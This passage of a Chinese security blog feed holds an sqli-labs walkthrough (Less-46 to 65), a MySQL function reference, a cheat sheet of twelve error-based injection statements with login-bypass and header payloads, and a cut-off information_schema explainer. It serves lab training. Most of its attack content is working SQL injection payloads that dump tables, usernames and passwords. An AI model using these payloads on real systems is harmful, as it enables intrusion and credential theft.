class="line">localhost/sqli-labs/Less-46/index.php?sort=extractvalue(1,concat(0x7e,(select group_concat(username,password) from users)))--+</span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-dbb269ebff6347c5.png" alt="图片.png"></p><h2 id="less-47"><a href="#less-47" class="headerlink" title="less-47"></a>less-47</h2><p>输入?sort&#x3D;1,回显正常，输入?sort&#x3D;1’,报错<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-798d701f70d97945.png" alt="图片.png"><br>根据报错提示，显示为单引号,故<br>爆表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-47/?sort=1%27%20and%20extractvalue(1,concat(0x7,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database())))--+</span><br></pre></td></tr></table></figure><p>以此类推。</p><h2 id="less-48"><a href="#less-48" class="headerlink" title="less-48"></a>less-48</h2><p><code>http://localhost/sqli-labs/Less-48/?sort=rand(ascii(left(database(),1))=178)</code><br><code>http://localhost/sqli-labs/Less-48/?sort=rand(ascii(left(database(),1))=115)</code><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-8efea021f130f0ad.png" alt="图片.png"></p><h2 id="less-49"><a href="#less-49" class="headerlink" title="less-49"></a>less-49</h2><p>延时注入：<br><code>http://localhost/sqli-labs/Less-49/index.php?sort=1%27%20and%20(If(ascii(substr((select%20username%20from%20users%20where%20id=1),1,1))=115,0,sleep(5)))--+</code><br>或者如less-48</p><h2 id="less-50"><a href="#less-50" class="headerlink" title="less-50"></a>less-50</h2><p><code>http://localhost/sqli-labs/Less-50/?sort=1;create%20table%20less50%20like%20users</code></p><h2 id="less-51"><a href="#less-51" class="headerlink" title="less-51"></a>less-51</h2><p><code>http://localhost/sqli-labs/Less-51/?sort=1%27;create%20table%20less51%20like%20users--+</code></p><h2 id="less-52"><a href="#less-52" class="headerlink" title="less-52"></a>less-52</h2><p><code>http://localhost/sqli-labs/Less-52/?sort=1;create%20table%20less52%20like%20users--+</code></p><h2 id="less-53"><a href="#less-53" class="headerlink" title="less-53"></a>less-53</h2><p><code>?sort=1%27;create%20table%20less53%20like%20users–+</code></p><h2 id="less-54"><a href="#less-54" class="headerlink" title="less-54"></a>less-54</h2><p>爆表：<br><code>http://localhost/sqli-labs/Less-54/index.php?id=0%27%20union%20select%201,1,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27challenges%27--+</code><br>爆列：<br><code>http://localhost/sqli-labs/Less-54/index.php?id=0%27%20union%20select%201,1,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27gxdghjy72p%27--+</code><br>爆值：<br><code>http://localhost/sqli-labs/Less-54/index.php?id=0%27%20union%20select%201,1,group_concat(secret_X79M)%20from%20gxdghjy72p--+</code></p><h2 id="less-55"><a href="#less-55" class="headerlink" title="less-55"></a>less-55</h2><p>多一个括号?id&#x3D;0) 次数为14次</p><h2 id="less-56"><a href="#less-56" class="headerlink" title="less-56"></a>less-56</h2><p>思路同上54 ,只不过多一个括号?id&#x3D;0’) 次数为14次</p><h2 id="less-57"><a href="#less-57" class="headerlink" title="less-57"></a>less-57</h2><p>思路同上，只不过 id&#x3D;”.$id.” 这里进行了双引号闭合<br><code>?id=-1”union select 1,1,group_concat(table_name) from information_schema.tables where table_schema=’challenges’%23</code></p><h2 id="less-58"><a href="#less-58" class="headerlink" title="less-58"></a>less-58</h2><p>尝试了查询database() 不返回数据。<br>那就只能试试报错注入了<br><code>?id=0’union select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=’challenges’),0x7e))--+</code></p><h2 id="less-59"><a href="#less-59" class="headerlink" title="less-59"></a>less-59</h2><p>同上，只不过没有单引号<br><code>?id=0 union select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=’challenges’),0x7e))--+</code></p><h2 id="less-60"><a href="#less-60" class="headerlink" title="less-60"></a>less-60</h2><p>同上，只不过多了双引号和括号?id&#x3D;0”)<br><code>?id=0”) union select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=’challenges’),0x7e))--+</code></p><h2 id="less-61"><a href="#less-61" class="headerlink" title="less-61"></a>less-61</h2><p>同上，只不过多了两个括号和一个双引号?id&#x3D;0’))<br><code>?id=0’)) union select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=’challenges’),0x7e))--+</code></p><h2 id="less-62"><a href="#less-62" class="headerlink" title="less-62"></a>less-62</h2><p>union和报错注入失效<br>使用延时注入<br><code>?id=1&#39;)and If(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39;),1,1))=79,0,sleep(10))--+</code></p><h2 id="less-63"><a href="#less-63" class="headerlink" title="less-63"></a>less-63</h2><p>同上62,只不过是单引号<br><code>?id=0%27and%20If(ascii(substr((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27challenges%27),1,1))=77,0,sleep(10))--++</code><br>正确时间短，错误时间长</p><h2 id="less-64"><a href="#less-64" class="headerlink" title="less-64"></a>less-64</h2><p>同上63,只不过是双括号<br><code>?id=0))and%20If(ascii(substr((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27challenges%27),1,1))=77,0,sleep(10))--+</code><br>正确时间短，错误时间长</p><h2 id="less-65"><a href="#less-65" class="headerlink" title="less-65"></a>less-65</h2><p>同上，只不过?id&#x3D;1”)<br><code>?id=1%22)and%20If(ascii(substr((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27challenges%27),1,1))=79,0,sleep(10))--+</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> Sql Lab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL Injection Functions</title>
      <link href="/2019/01/22/SQL-Injection-Functions/"/>
      <url>/2019/01/22/SQL-Injection-Functions/</url>
      
        <content type="html"><![CDATA[<blockquote><p>version():mysql版本<br>user():用户名<br>database():数据库名<br>@@datadir:读取数据库路径<br>@@version_compile_os:操作系统版本<br>concat(str1,str2,…):没有分割符地连接字符串，显示数据（数据合并）<br>group_concat(str1,str2,…):连接一个组的所有字符串，并以逗号分割每一条数据，显示数据<br>into outfile：写文件{select ‘需要写的文件’ into outfile ‘目录下’}<br>select ‘123123’ into outfile ‘d:&#x2F;&#x2F;study&#x2F;1.txt’;(将123123添加至d盘study中新建1.txt文件中)<br>group_concat(列名):会把这一列中所有的内容在一行中以,隔开输出<br>select load_file(读文件路径)；<br>length（） &#x3D;&gt;计算字符串长度<br>hex（） &#x3D;&gt;字符转换为16进制<br>@@basedir MYSQL获取安装路径</p></blockquote><h2 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h2><blockquote><p>group_concat(str1,str2,…):连接一个组的所有字符串，并以逗号分割每一条数据，显示数据<br>mid()函数：从一个字符串中截取出指定数量的字符<br>mid(string,start,length)<br>string(必需)规定要返回其中一部分的字符串。<br>start(必需)规定开始位置（起始值是 1）。<br>length(可选)要返回的字符数。如果省略，则 mid() 函数返回剩余文本。<br>substr()函数：函数返回字符串的一部分。<br>substr(string,start,length)<br>string(必需)规定要返回其中一部分的字符串。<br>start(必需)规定在字符串的何处开始。<br>length(可选)规定被返回字符串的长度。<br>left()函数：取字符的多少位字符<br>left(string,length)<br>string(必需)规定要返回其中一部分的字符串<br>length（可选）规定被返回字符串的前length长度的字符<br>load_file()函数：导出文件<br>Load_file(file_name):读取文件并返回该文件的内容作为一个字符串。<br>substr(str, pos, len)：将str从pos位置开始截取len长度的字符进行返回。*注意:这里的pos位置        是从1开始的，不是数组的0开始<br>ascii(str)：返回字符串str的最左面字符的ASCII代码值。<br>ord(str):同上，返回ascii码<br>if(a,b,c) :a为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0),返回0<br>concat:用于将两个字符串连接起来，形成一个单一的字符串。返回结果为连接参数产生的字符串。</p></blockquote><h2 id="详解"><a href="#详解" class="headerlink" title="详解"></a>详解</h2><h3 id="UPDATEXML"><a href="#UPDATEXML" class="headerlink" title="UPDATEXML"></a>UPDATEXML</h3><blockquote><p>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，<a href="https://www.jb51.net/article/125607.htm">了解Xpath语法</a><br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值<br>改变XML_document中符合XPATH_string的值<br>而我们的注入语句为：<br>updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)<br>其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出<br>ERROR 1105 (HY000): XPATH syntax error: ‘:root@localhost’</p></blockquote><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><blockquote><p>extractvalue()：从目标XML中返回包含所查询值的字符串<br>extractvalue (XML_document, XPath_string)<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串)<br>payloaod:<br>　　and extractvalue(null,concat(0x7e,(select @@datadir),0x7e));<br>extractvalue注入的原理：依旧如同updatexml一样，extract的第二个参数要求是xpath格式字符串，而我们输入的并不是。所以报错。</p></blockquote><h3 id="ASCII-s"><a href="#ASCII-s" class="headerlink" title="ASCII(s)"></a>ASCII(s)</h3><blockquote><p>ASCII(s)<br>返回字符串 s 的第一个字符的 ASCII 码。<br>返回 CustomerName 字段第一个字母的 ASCII 码：<br>SELECT ASCII(CustomerName) AS NumCodeOfFirstChar FROM Customers;</p></blockquote><h3 id="CHAR-LENGTH-s"><a href="#CHAR-LENGTH-s" class="headerlink" title="CHAR_LENGTH(s)"></a>CHAR_LENGTH(s)</h3><blockquote><p>CHAR_LENGTH(s)<br>返回字符串 s 的字符数<br>返回字符串 RUNOOB 的字符数<br>SELECT CHAR_LENGTH(“RUNOOB”) AS LengthOfString;</p></blockquote><h3 id="CHARACTER-LENGTH-s"><a href="#CHARACTER-LENGTH-s" class="headerlink" title="CHARACTER_LENGTH(s)"></a>CHARACTER_LENGTH(s)</h3><blockquote><p>CHARACTER_LENGTH(s)<br>返回字符串 s 的字符数<br>返回字符串 RUNOOB 的字符数<br>SELECT CHARACTER_LENGTH(“RUNOOB”) AS LengthOfString;</p></blockquote><h3 id="CONCAT-s1-s2…sn"><a href="#CONCAT-s1-s2…sn" class="headerlink" title="CONCAT(s1,s2…sn)"></a>CONCAT(s1,s2…sn)</h3><blockquote><p>CONCAT(s1,s2…sn)<br>字符串 s1,s2 等多个字符串合并为一个字符串<br>合并多个字符串<br>SELECT CONCAT(“SQL “,  “Runoob “,  “Gooogle “,  “Facebook”) AS ConcatenatedString;</p></blockquote><h3 id="CONCAT-WS-x-s1-s2…sn"><a href="#CONCAT-WS-x-s1-s2…sn" class="headerlink" title="CONCAT_WS(x, s1,s2…sn)"></a>CONCAT_WS(x, s1,s2…sn)</h3><blockquote><p>CONCAT_WS(x, s1,s2…sn)<br>同 CONCAT(s1,s2,…) 函数，但是每个字符串直接要加上 x，x 可以是分隔符<br>合并多个字符串，并添加分隔符：<br>SELECT CONCAT_WS(“-“,  “SQL”,  “Tutorial”,  “is”,  “fun!”)AS ConcatenatedString;</p></blockquote><h3 id="FIELD-s-s1-s2…"><a href="#FIELD-s-s1-s2…" class="headerlink" title="FIELD(s,s1,s2…)"></a>FIELD(s,s1,s2…)</h3><blockquote><p>FIELD(s,s1,s2…)<br>返回第一个字符串 s 在字符串列表(s1,s2…)中的位置<br>返回字符串 c 在列表值中的位置：<br>SELECT FIELD(“c”,  “a”,  “b”,  “c”,  “d”,  “e”);</p></blockquote><h3 id="FIND-IN-SET-s1-s2"><a href="#FIND-IN-SET-s1-s2" class="headerlink" title="FIND_IN_SET(s1,s2)"></a>FIND_IN_SET(s1,s2)</h3><blockquote><p>FIND_IN_SET(s1,s2)<br>返回在字符串s2中与s1匹配的字符串的位置<br>返回字符串 c 在指定字符串中的位置：<br>SELECT FIND_IN_SET(“c”,  “a,b,c,d,e”);</p></blockquote><h3 id="FORMAT-x-n"><a href="#FORMAT-x-n" class="headerlink" title="FORMAT(x,n)"></a>FORMAT(x,n)</h3><blockquote><p>FORMAT(x,n)<br>函数可以将数字 x 进行格式化 “#,###.##”, 将 x 保留到小数点后 n 位，最后一位四舍五入。<br>格式化数字 “#,###.##” 形式：<br>SELECT FORMAT(250500.5634,  2);  –  输出  250,500.56</p></blockquote><h3 id="INSERT-s1-x-len-s2"><a href="#INSERT-s1-x-len-s2" class="headerlink" title="INSERT(s1,x,len,s2)"></a>INSERT(s1,x,len,s2)</h3><blockquote><p>INSERT(s1,x,len,s2)<br>字符串 s2 替换 s1 的 x 位置开始长度为 len 的字符串<br>从字符串第一个位置开始的 6 个字符替换为 baiduu：<br>SELECT INSERT(“google.com”,  1,  6,  “baidu”);  –  输出：baiduu.com</p></blockquote><h3 id="LOCATE-s1-s"><a href="#LOCATE-s1-s" class="headerlink" title="LOCATE(s1,s)"></a>LOCATE(s1,s)</h3><blockquote><p>LOCATE(s1,s)<br>从字符串 s 中获取 s1 的开始位置<br>获取 b 在字符串 abc 中的位置：<br>SELECT LOCATE(‘st’,’myteststring’);  –  5</p></blockquote><h3 id="LEFT-s-n"><a href="#LEFT-s-n" class="headerlink" title="LEFT(s,n)"></a>LEFT(s,n)</h3><blockquote><p>LEFT(s,n) 返回字符串 s 的前 n 个字符<br>返回字符串hello 中的前两个字符<br>SELECT LEFT(‘hello’,2)  – he</p></blockquote><h3 id="LEFT-s-n-1"><a href="#LEFT-s-n-1" class="headerlink" title="LEFT(s,n)"></a>LEFT(s,n)</h3><blockquote><p>LEFT(s,n)<br>返回字符串 s 的前 n 个字符<br>返回字符串 abcde 的前两个字符：<br>SELECT LEFT(‘abcde’,2)  – ab</p></blockquote><h3 id="LOCATE-s1-s-1"><a href="#LOCATE-s1-s-1" class="headerlink" title="LOCATE(s1,s)"></a>LOCATE(s1,s)</h3><blockquote><p>LOCATE(s1,s)<br>从字符串 s 中获取 s1 的开始位置<br>返回字符串 abc 中 b 的位置：<br>SELECT LOCATE(‘b’,  ‘abc’)  –  2</p></blockquote><h3 id="LPAD-s1-len-s2"><a href="#LPAD-s1-len-s2" class="headerlink" title="LPAD(s1,len,s2)"></a>LPAD(s1,len,s2)</h3><blockquote><p>LPAD(s1,len,s2)<br>在字符串 s1 的开始处填充字符串 s2，使字符串长度达到 len<br>将字符串 xx 填充到 abc 字符串的开始处：<br>SELECT LPAD(‘abc’,5,’xx’)  – xxabc</p></blockquote><h3 id="MID-s-n-len"><a href="#MID-s-n-len" class="headerlink" title="MID(s,n,len)"></a>MID(s,n,len)</h3><blockquote><p>MID(s,n,len)<br>从字符串 s 的 start 位置截取长度为 length 的子字符串，同 SUBSTRING(s,n,len)<br>从字符串 HELLO 中的第 2 个位置截取 3个 字符：<br>SELECT MID(“HELLO”,  2,  3) AS ExtractString;  –ELL</p></blockquote><h3 id="POSITION-s1-IN-s"><a href="#POSITION-s1-IN-s" class="headerlink" title="POSITION(s1 IN s)"></a>POSITION(s1 IN s)</h3><blockquote><p>POSITION(s1 IN s)<br>从字符串 s 中获取 s1 的开始位置<br>返回字符串 abc 中 b 的位置：<br>SELECT POSITION(‘b’  in  ‘abc’)  –  2</p></blockquote><h3 id="REPEAT-s-n"><a href="#REPEAT-s-n" class="headerlink" title="REPEAT(s,n)"></a>REPEAT(s,n)</h3><blockquote><p>REPEAT(s,n) 将字符串 s 重复 n 次<br>将字符串HELLO重复三次：<br>SELECT REPEAT(‘HELLO’,3)  </p></blockquote><h3 id="REPLACE-s-s1-s2"><a href="#REPLACE-s-s1-s2" class="headerlink" title="REPLACE(s,s1,s2)"></a>REPLACE(s,s1,s2)</h3><blockquote><p>REPLACE(s,s1,s2)<br>将字符串 s2 替代字符串 s 中的字符串 s1<br>将字符串 abc 中的字符 a 替换为字符 x：<br>SELECT REPLACE(‘abc’,’a’,’x’)  –xbc</p></blockquote><h3 id="REVERSE-s"><a href="#REVERSE-s" class="headerlink" title="REVERSE(s)"></a>REVERSE(s)</h3><blockquote><p>REVERSE(s)<br>将字符串s的顺序反过来<br>将字符串 abc 的顺序反过来<br>SELECT REVERSE(‘abc’)  – cba</p></blockquote><h3 id="RIGHT-s-n"><a href="#RIGHT-s-n" class="headerlink" title="RIGHT(s,n)"></a>RIGHT(s,n)</h3><blockquote><p>RIGHT(s,n)<br>返回字符串 s 的后 n 个字符<br>返回字符串 HELLO 的后两个字符：<br>SELECT RIGHT(‘HELLO’,2)  </p></blockquote><h3 id="RPAD-s1-len-s2"><a href="#RPAD-s1-len-s2" class="headerlink" title="RPAD(s1,len,s2)"></a>RPAD(s1,len,s2)</h3><blockquote><p>RPAD(s1,len,s2)<br>在字符串 s1 的结尾处添加字符串 s2，使字符串的长度达到 len<br>将字符串 xx 填充到 abc 字符串的结尾处：<br>SELECT RPAD(‘abc’,5,’xx’)  – abcxx</p></blockquote><h3 id="STRCMP-s1-s2"><a href="#STRCMP-s1-s2" class="headerlink" title="STRCMP(s1,s2)"></a>STRCMP(s1,s2)</h3><blockquote><p>STRCMP(s1,s2)<br>比较字符串 s1 和 s2，如果 s1 与 s2 相等返回 0 ，如果 s1&gt;s2 返回 1，如果 s1&lt;s2 返回 -1<br>比较字符串：<br>SELECT STRCMP(“A”,  “A”);  –  0</pre></p></blockquote><h3 id="SUBSTR-s-start-length"><a href="#SUBSTR-s-start-length" class="headerlink" title="SUBSTR(s, start, length)"></a>SUBSTR(s, start, length)</h3><blockquote><p>SUBSTR(s, start, length)<br>从字符串 s 的 start 位置截取长度为 length 的子字符串<br>从字符串 ASDF 中的第 2 个位置截取 3个 字符：<br>SELECT SUBSTR(“ASDF”,  2,  3) AS ExtractString;  – SDF</p></blockquote><h3 id="SUBSTRING-s-start-length"><a href="#SUBSTRING-s-start-length" class="headerlink" title="SUBSTRING(s, start, length)"></a>SUBSTRING(s, start, length)</h3><blockquote><p>SUBSTRING(s, start, length)<br>从字符串 s 的 start 位置截取长度为 length 的子字符串<br>从字符串 ASDF 中的第 2 个位置截取 3个 字符：<br>SELECT SUBSTRING(“ASDF”,  2,  3) AS ExtractString;  – SDF</p></blockquote><h3 id="SUBSTRING-INDEX-s-delimiter-number"><a href="#SUBSTRING-INDEX-s-delimiter-number" class="headerlink" title="SUBSTRING_INDEX(s, delimiter, number)"></a>SUBSTRING_INDEX(s, delimiter, number)</h3><blockquote><p>SUBSTRING_INDEX(s, delimiter, number)<br>返回从字符串 s 的第 number 个出现的分隔符 delimiter 之后的子串。<br>如果 number 是正数，返回第 number 个字符左边的字符串。<br>如果 number 是负数，返回第(number 的绝对值(从右边数))个字符右边的字符串。<br>SELECT SUBSTRING_INDEX(‘a<em>b’,’</em>‘,1)  – a<br>SELECT SUBSTRING_INDEX(‘a<em>b’,’</em>‘,-1)    – b<br>SELECT SUBSTRING_INDEX(SUBSTRING_INDEX(‘a<em>b</em>c<em>d</em>e’,’<em>‘,3),’</em>‘,-1)    – c</p></blockquote><h3 id="AVG-expression"><a href="#AVG-expression" class="headerlink" title="AVG(expression)"></a>AVG(expression)</h3><blockquote><p>AVG(expression)<br>返回一个表达式的平均值，expression 是一个字段<br>返回 Products 表中Price 字段的平均值：<br>SELECT AVG(Price) AS AveragePrice FROM Products;</p></blockquote><h3 id="CEIL-x"><a href="#CEIL-x" class="headerlink" title="CEIL(x)"></a>CEIL(x)</h3><blockquote><p>CEIL(x) | 返回大于或等于 x 的最小整数<br>SELECT CEIL(1.5)  –  返回2</p></blockquote><h3 id="CEILING-x"><a href="#CEILING-x" class="headerlink" title="CEILING(x)"></a>CEILING(x)</h3><blockquote><p>CEILING(x) | 返回大于或等于 x 的最小整数　<br>SELECT CEIL(1.5)  –  返回2</p></blockquote><h3 id="COUNT-expression"><a href="#COUNT-expression" class="headerlink" title="COUNT(expression)"></a>COUNT(expression)</h3><blockquote><p>COUNT(expression)<br>返回查询的记录总数，expression 参数是一个字段或者 * 号<br>返回 Products 表中 products 字段总共有多少条记录：<br>SELECT COUNT(ProductID) AS NumberOfProducts FROM Products;</p></blockquote><h3 id="FLOOR-x"><a href="#FLOOR-x" class="headerlink" title="FLOOR(x)"></a>FLOOR(x)</h3><blockquote><p>FLOOR(x) | 返回小于或等于 x 的最大整数<br>小于或等于 1.5 的整数：<br>SELECT FLOOR(1.5)  –  返回1</p></blockquote><h2 id="附"><a href="#附" class="headerlink" title="附"></a>附</h2><p>几个关于floor报错原理的解释</p><ul><li><a href="https://www.cnblogs.com/xdans/p/5412468.html">https://www.cnblogs.com/xdans/p/5412468.html</a></li><li><a href="https://www.cnblogs.com/litlife/p/8472323.html">https://www.cnblogs.com/litlife/p/8472323.html</a></li><li><a href="http://www.cnblogs.com/xishaonian/p/6227405.html">http://www.cnblogs.com/xishaonian/p/6227405.html</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Twelve Types of Error Injection and Universal Statements</title>
      <link href="/2019/01/22/12-Types-of-Error-Injection-and-Universal-Statements/"/>
      <url>/2019/01/22/12-Types-of-Error-Injection-and-Universal-Statements/</url>
      
        <content type="html"><![CDATA[<h2 id="12种报错注入"><a href="#12种报错注入" class="headerlink" title="12种报错注入"></a>12种报错注入</h2><p> 1、通过floor报错,注入语句如下:<br>    and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);</p><p>2、通过ExtractValue报错,注入语句如下:<br>    and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</p><p>3、通过UpdateXml报错,注入语句如下:<br>    and 1&#x3D;(updatexml(1,concat(0x3a,(select user())),1))</p><p>4、通过NAME_CONST报错,注入语句如下:<br>    and exists(select<em>from (select</em>from(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c) </p><p>5、通过join报错,注入语句如下:<br>    select * from(select * from mysql.user ajoin mysql.user b)c;   </p><p>6、通过exp报错,注入语句如下:<br>and exp(~(select * from (select user () ) a) );</p><p>7、通过GeometryCollection()报错,注入语句如下:<br>and GeometryCollection(()select *from(select user () )a)b );</p><p>8、通过polygon ()报错,注入语句如下:<br>and polygon (()select * from(select user ())a)b );</p><p>9、通过multipoint ()报错,注入语句如下:<br>and multipoint (()select * from(select user() )a)b );</p><p>10、通过multlinestring ()报错,注入语句如下:<br>and multlinestring (()select * from(selectuser () )a)b );</p><p>11、通过multpolygon ()报错,注入语句如下:<br>and multpolygon (()select * from(selectuser () )a)b );</p><p>12、通过linestring ()报错,注入语句如下:<br>and linestring (()select * from(select user() )a)b );</p><h2 id="关于POST注入"><a href="#关于POST注入" class="headerlink" title="关于POST注入"></a>关于POST注入</h2><p> 常用的万能username语句：</p><blockquote><p>a ’ or 1&#x3D;1 #<br>a “) or 1&#x3D;1 #<br>a‘) or 1&#x3D;1 #<br>a” or “1”&#x3D;”1<br>‘ or ‘1’&#x3D;’1<br>‘ or (length(database())) &#x3D; 8  (用于输入’ “都没有错误)<br>‘ or (ascii(substr((select database()) ,1,1))) &#x3D; 115 # (用于输入’ “都没有错误)<br>“) or (“1”)&#x3D;(“1<br>“) or 1&#x3D;1 or if(1&#x3D;1, sleep(1), null)  #<br>“) or (length(database())) &#x3D; 8 #<br>“) or (ascii(substr((select database()) ,1,1))) &#x3D; 115  or if(1&#x3D;1, sleep(1), null)  # </p></blockquote><h3 id="post型盲注通杀payload："><a href="#post型盲注通杀payload：" class="headerlink" title="post型盲注通杀payload："></a>post型盲注通杀payload：</h3><p>uname&#x3D;admin%df’or()or%200%23&amp;passwd&#x3D;&amp;submit&#x3D;Submit</p><h2 id="updatexml报错注入"><a href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a>updatexml报错注入</h2><p><strong>UPDATEXML,REFERER,COOKIE的构造</strong></p><p>User-Agent:<code>&#39; or updatexml(1,concat(0x7e,database(),0x7e),1),”,”) #</code><br>Referer: <code> ’ or updatexml(1,concat(0x7e,database(),0x7e),1),”,”) #</code><br>Cookie:username: admin ’ or updatexml(1,concat(0x7e,database(),0x7e),1) #</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>爆数据库版本信息：<code>?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</code><br> 链接用户：<code>?id=1 and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)</code><br> 链接数据库：<code>?id=1 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)</code><br> 爆库：<code>?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select schema_name),0x7e) FROM admin limit 0,1),0x7e),1)</code><br> 爆表：<code>?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select table_name),0x7e) FROM admin limit 0,1),0x7e),1)</code><br> 爆字段：<code>?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select column_name),0x7e) FROM admin limit 0,1),0x7e),1)</code><br> 爆字段内容：<code>?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Detailed Discussion on information_schema</title>
      <link href="/2019/01/22/Detailed-Discussion-on-information_schema/"/>
      <url>/2019/01/22/Detailed-Discussion-on-information_schema/</url>
      
        <content type="html"><![CDATA[<p>information_schema数据库是MySQL系统自带的数据库，它提供了数据库元数据的访问方式。</p><h1 id="1：关于字符集和排序规则相关的系统表"><a href="#1：关于字符集和排序规则相关的系统表" class="headerlink" title="1：关于字符集和排序规则相关的系统表"></a>1：关于字符集和排序规则相关的系统表</h1><p>CHARACTER_SETS ：存储数据库相关字符集信息（memory存储引擎）</p><p>COLLATIONS ：字符集对应的排序规则</p><p>COLLATION_CHARACTER_SET_APPLICABILITY：就是一个字符集和连线校对的一个对应关系而已</p><p>下面我们说一下character sets和collations的区别：</p><p>字符集（character sets）存储字符串，是指人类语言中最小的表义符号。例如’A’、’B’等；</p><p>排序规则（collations）规则比较字符串，collations是指在同一字符集内字符之间的比较规则</p><p>每个字符序唯一对应一种字符集，但一个字符集可以对应多种字符序，其中有一个是默认字符序(Default Collation)</p><p> MySQL中的字符序名称遵从命名惯例：以字符序对应的字符集名称开头；以_ci(表示大小写不敏感)、_cs(表示大小写敏感)或_bin(表示按编码值比较)结尾。例如：在字符序“utf8_general_ci”下，字符“a”和“A”是等价的</p><p>看一下有关于字符集和校对相关的MySQL变量：</p><p>character_set_server：默认的内部操作字符集</p><p>character_set_client：客户端来源数据使用的字符集</p><p>character_set_connection：连接层字符集</p><p>character_set_results：查询结果字符集</p><p>character_set_database：当前选中数据库的默认字符集</p><p>character_set_system：系统元数据(字段名等)字符集</p><p>再看一下MySQL中的字符集转换过程：</p><p>（1）. MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection；</p><p>（2）. 进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，其确定方法如下：</p><p>使用每个数据字段的CHARACTER SET设定值；</p><p>若上述值不存在，则使用对应数据表的DEFAULT CHARACTER SET设定值(MySQL扩展，非SQL标准)；</p><p>若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值；</p><p>若上述值不存在，则使用character_set_server设定值。</p><p>（3）. 将操作结果从内部操作字符集转换为character_set_results。</p><h1 id="2：权限相关的一些表"><a href="#2：权限相关的一些表" class="headerlink" title="2：权限相关的一些表"></a>2：权限相关的一些表</h1><p>SCHEMA_PRIVILEGES：提供了数据库的相关权限，这个表是内存表是从mysql.db中拉去出来的。</p><p>TABLE_PRIVILEGES:提供的是表权限相关信息，信息是从 mysql.tables_priv 表中加载的</p><p>COLUMN_PRIVILEGES ：这个表可以清楚就能看到表授权的用户的对象，那张表那个库以及授予的是什么权限，如果授权的时候加上with grant option的话，我们可以看得到PRIVILEGE_TYPE这个值必须是YES。</p><p>USER_PRIVILEGES:提供的是表权限相关信息，信息是从 mysql.user 表中加载的</p><p>通过表我们可以很清晰看得到MySQL授权的层次，SCHEMA，TABLE，COLUMN级别，当然这些都是基于用户来授予的。可以看得到MySQL的授权也是相当的细密的，可以具体到列，这在某一些应用场景下还是很有用的，比如审计等。</p><h1 id="3：存储数据库系统的实体对象的一些表"><a href="#3：存储数据库系统的实体对象的一些表" class="headerlink" title="3：存储数据库系统的实体对象的一些表"></a>3：存储数据库系统的实体对象的一些表</h1><p>COLUMNS：存储表的字段信息，所有的存储引擎</p><p>INNODB_SYS_COLUMNS ：存放的是INNODB的元数据， 他是依赖于SYS_COLUMNS这个统计表而存在的。</p><p>ENGINES ：引擎类型，是否支持这个引擎，描述，是否支持事物，是否支持分布式事务，是否能够支持事物的回滚点</p><p>EVENTS ：记录MySQL中的事件，类似于定时作业</p><p>FILES ：这张表提供了有关在MySQL的表空间中的数据存储的文件的信息，文件存储的位置，这个表的数据是从InnoDB in-memory中拉取出来的，所以说这张表本身也是一个内存表，每次重启重新进行拉取。也就是我们下面要说的INNODB_SYS_DATAFILES这张表。还要注意一点的是这张表包含有临时表的信息，所以说和SYS_DATAFILES 这张表是不能够对等的，还是要从INNODB_SYS_DATAFILES看。如果undo表空间也配置是InnoDB 的话，那么也是会被记录下来的。</p><p>PARAMETERS 